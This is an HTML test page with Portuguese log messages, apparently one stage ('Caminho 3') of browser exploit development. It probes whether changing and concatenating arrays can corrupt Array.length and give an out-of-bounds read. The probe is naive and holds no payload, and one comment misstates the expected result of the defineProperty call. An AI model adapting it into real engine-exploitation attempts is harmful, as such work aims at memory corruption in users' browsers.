
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Phase-3 — Array.length Corruption Test</title>
</head>
<body>
<pre id="log"></pre>
<button onclick="run()">EXECUTAR TESTE CAMINHO 3</button>

<script>
const log = s => document.getElementById("log").textContent += s + "\n";

function run() {
    log("=== CAMINHO 3: ARRAY.LENGTH CORRUPTION ===");

    let arr = [1.1, 2.2, 3.3, 4.4];
    let victim = new Float64Array(4);
    victim[0] = 13.37;

    log("[*] Estado inicial:");
    log("arr.length = " + arr.length);

    try {
        Object.defineProperty(arr, "length", {
            writable: true,
            value: 0xFFFFFFFF
        });
        log("[*] Tentativa de expandir length manualmente.");
    } catch (e) {
        log("[-] DefineProperty falhou (esperado).");
    }

    // tentativa de confusão via concat / slice
    let evil = arr.concat(arr, arr, arr);

    log("[*] evil.length = " + evil.length);

    try {
        let v = evil[1000];
        log("[*] Leitura fora do limite: " + v);
        if (v !== undefined) {
            log("!!! SUCESSO: OOB VIA ARRAY.LENGTH !!!");
            return;
        }
    } catch (e) {
        log("[-] Exceção ao acessar OOB (normal).");
    }

    log("[-] Nenhuma corrupção de Array.length detectada.");
}
</script>
</body>
</html>
